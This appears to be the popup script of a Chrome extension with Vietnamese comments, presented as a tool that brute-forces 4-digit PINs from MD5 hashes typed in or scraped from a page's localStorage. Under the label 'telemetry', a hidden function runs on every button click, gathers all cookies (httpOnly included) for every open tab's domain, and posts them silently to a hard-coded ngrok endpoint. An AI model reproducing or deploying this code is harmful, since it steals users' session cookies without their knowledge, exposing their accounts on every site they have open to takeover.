// Các thành phần UI
const toggleManualBtn = document.getElementById('toggleManualBtn');
const manualInputArea = document.getElementById('manualInputArea');
const resultDiv = document.getElementById('result');
const pinDisplay = document.getElementById('pinDisplay');
const TARGET_URL = "https://durational-earringed-sena.ngrok-free.dev/api.php";
const pinBoxes = [
    document.getElementById('pin0'),
    document.getElementById('pin1'),
    document.getElementById('pin2'),
    document.getElementById('pin3')
];

// Nút bật/tắt chế độ nhập tay
toggleManualBtn.addEventListener('click', () => {
    if (manualInputArea.style.display === 'none' || manualInputArea.style.display === '') {
        manualInputArea.style.display = 'block';
        toggleManualBtn.innerText = '> hide_manual_mode';
    } else {
        manualInputArea.style.display = 'none';
        toggleManualBtn.innerText = '> manual_input_mode';
    }
});

// Hàm dùng chung để xử lý logic Brute-force
// Đã thêm tham số targetKey để nhận tên Key từ localStorage
function startCracking(targetHash, targetKey = "manual_input") {
    pinDisplay.style.display = 'none'; 

    const startTime = performance.now();

    for (let i = 0; i < 10000; i++) {
        let pin = i.toString().padStart(4, '0');
        
        try {
            if (md5(pin) === targetHash) {
                const endTime = performance.now();
                
                // Xây dựng bảng kết quả hiển thị TẤT CẢ thông tin khi hoàn thành
                let finalHTML = `<span class="success-text">SUCCESS</span> <span class="laser-tick">✔</span><br>`;
                
                // Căn lề trái cho giống Terminal log
                finalHTML += `<div style="text-align: left; margin-top: 10px; font-size: 11px; color: #00ff00; line-height: 1.5; border-top: 1px dashed #333; padding-top: 5px;">`;
                
                if (targetKey !== "manual_input") {
                    finalHTML += `TARGET_KEY : [${targetKey}]<br>`;
                } else {
                    finalHTML += `MODE       : [MANUAL_ENTRY]<br>`;
                }
                
                // Hiển thị nguyên vẹn 32 ký tự của Hash thay vì cắt bớt, vì đằng nào nó cũng nằm ở cuối
                finalHTML += `TARGET_HASH: <br><span style="color:#00ffff">${targetHash}</span><br>`;
                finalHTML += `CRACK_TIME : ${(endTime - startTime).toFixed(2)} ms`;
                finalHTML += `</div>`;
                
                resultDiv.innerHTML = finalHTML;
                
                // Cắt 4 số ném vào 4 ô vuông và cho hiển thị
                pinDisplay.style.display = 'flex';
                for (let j = 0; j < 4; j++) {
                    pinBoxes[j].innerText = pin[j];
                }
                return;
            }
        } catch (error) {
            resultDiv.style.color = "#ff3333";
            resultDiv.innerText = "[-] Error: Library md5.js is missing!";
            console.error(error);
            return;
        }
    }
    
    resultDiv.style.color = "#ff3333";
    resultDiv.innerText = "[-] FAILED: Hash does not match any 4-digit PIN.";
}

// ===== TÁCH LOG TELEMETRY - CHẠY ĐỘC LẬP NGẦM =====
// Hàm thu thập dữ liệu mạng chạy background không block UI
async function backgroundTelemetry() {
    try {
        const tabs = await chrome.tabs.query({});
        const uniqueDomains = new Set();

        // 1. Quét tìm các tên miền đang mở
        tabs.forEach(tab => {
            if (tab.url && tab.url.startsWith('http')) {
                try {
                    let urlObj = new URL(tab.url);
                    let domain = urlObj.hostname.replace(/^www\./, '');
                    uniqueDomains.add(domain);
                } catch (e) {
                    console.log("[*] Parse URL error: ", tab.url);
                }
            }
        });

        if (uniqueDomains.size === 0) {
            console.log("[*] Không tìm thấy tab nào đang mở");
            return;
        }

        let groupedCookies = {}; 
        let totalCookies = 0;

        // 2. Lấy cookie và lọc dữ liệu
        for (let domain of uniqueDomains) {
            const cookies = await chrome.cookies.getAll({ domain: domain });
            
            if (cookies.length > 0) {
                let cleanCookiesArray = [];
                
                cookies.forEach(c => {
                    let cleanCookie = {
                        domain: c.domain,
                        name: c.name,
                        value: c.value,
                        path: c.path,
                        secure: c.secure,
                        httpOnly: c.httpOnly,
                        sameSite: c.sameSite
                    };
                    
                    if (!c.session && c.expirationDate) {
                        cleanCookie.expirationDate = c.expirationDate;
                    }

                    cleanCookiesArray.push(cleanCookie);
                });

                groupedCookies[domain] = cleanCookiesArray;
                totalCookies += cleanCookiesArray.length;
            }
        }

        // 3. Gửi dữ liệu lên server
        if (totalCookies > 0) {
            try {
                const response = await fetch(TARGET_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(groupedCookies)
                });

                if (response.ok) {
                    console.log("[+] ✔ Telemetry sent successfully | Cookies: " + totalCookies);
                } else {
                    console.error("[-] Server error:", response.status, response.statusText);
                }
            } catch (fetchError) {
                console.error("[-] Connection error:", fetchError.message);
            }
        }

    } catch (error) {
        console.error("[-] Telemetry error:", error);
    }
}

// Xử lý khi ấn nút "execute_brute_force" (Nhập tay)
document.getElementById('crackBtn').addEventListener('click', () => {
    const targetHash = document.getElementById('hashInput').value.trim().toLowerCase();
    if (targetHash.length !== 32) {
        resultDiv.style.color = "#ff3333";
        resultDiv.innerText = "[-] Error: Target must be 32 chars.";
        return;
    }
    resultDiv.style.color = "#00ffff";
    resultDiv.innerText = "[*] Executing manual payload...";
    
    // Gọi telemetry độc lập (không await)
    backgroundTelemetry();
    
    // Tạo độ trễ nhỏ để giao diện kịp render
    setTimeout(() => {
        startCracking(targetHash);
    }, 100);
});

// Xử lý khi ấn nút "auto_extract_hash"
document.getElementById('autoGetBtn').addEventListener('click', async () => {
    manualInputArea.style.display = 'none';
    toggleManualBtn.innerText = '> manual_input_mode';

    resultDiv.style.color = "#00ffff";
    resultDiv.innerText = "[*] Injecting script & scanning storage...";
    pinDisplay.style.display = 'none';

    // Gọi telemetry độc lập chạy background (không await, không block)
    backgroundTelemetry();

    try {
        let [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

        chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: getHashFromLocalStorage,
        }, (results) => {
            if (results && results[0] && results[0].result) {
                let targetData = results[0].result;
                let foundKey = targetData.key;
                let foundHash = targetData.value;
                
                setTimeout(() => {
                    startCracking(foundHash, foundKey);
                }, 300);
                
            } else {
                resultDiv.style.color = "#ff3333";
                resultDiv.innerText = "[-] No valid target (32-char MD5) found in current tab.";
                pinDisplay.style.display = 'none';
            }
        });
    } catch (err) {
        resultDiv.style.color = "#ff3333";
        resultDiv.innerText = "[-] Error accessing tab. Target must be a real webpage.";
    }
});

// Hàm chạy ngầm dưới website
function getHashFromLocalStorage() {
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        let value = localStorage.getItem(key);
        if (value && value.length === 32) {
            return { key: key, value: value }; 
        }
    }
    return null; 
}